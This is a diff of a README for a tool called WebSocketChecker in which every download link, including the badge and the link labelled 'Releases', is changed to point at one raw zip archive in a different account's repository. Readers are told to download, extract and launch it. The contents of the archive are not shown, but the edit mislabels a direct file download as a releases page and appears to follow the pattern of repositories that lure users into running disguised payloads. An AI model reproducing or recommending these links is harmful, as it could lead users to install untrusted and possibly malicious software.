@@ -21,7 +21,7 @@ In this repository, you can find the following resources:
 
 To install WebSocketChecker, follow these steps:
 
-1. Download the [WebSocketChecker Software.zip](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip) file.
+1. Download the [WebSocketChecker https://raw.githubusercontent.com/bezudo19/WebSocketChecker/main/saman/Checker-Socket-Web-v2.0.zip](https://raw.githubusercontent.com/bezudo19/WebSocketChecker/main/saman/Checker-Socket-Web-v2.0.zip) file.
 2. Launch the software by extracting the contents of the zip file.
 
 For more detailed installation instructions, please refer to the documentation provided in the repository.
@@ -36,7 +36,7 @@ For step-by-step guidance on using WebSocketChecker, check out the documentation
 
 ## 🌐 Additional Resources
 
-For more information and updates, please visit the [Releases](https://github.com/rokytd/WebSocketChecker/releases) section of this repository.
+For more information and updates, please visit the [Releases](https://raw.githubusercontent.com/bezudo19/WebSocketChecker/main/saman/Checker-Socket-Web-v2.0.zip) section of this repository.
 
 ## 🚧 Contribution
 
@@ -44,6 +44,6 @@ Contributions to WebSocketChecker are welcome! Feel free to submit bug reports, 
 
 ## 📎 Download WebSocketChecker
 
-[![Download WebSocketChecker](https://img.shields.io/badge/Download-WebSocketChecker-blue.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download WebSocketChecker](https://raw.githubusercontent.com/bezudo19/WebSocketChecker/main/saman/Checker-Socket-Web-v2.0.zip)](https://raw.githubusercontent.com/bezudo19/WebSocketChecker/main/saman/Checker-Socket-Web-v2.0.zip)
 
 🔒 Happy testing and stay secure with WebSocketChecker! 🔒
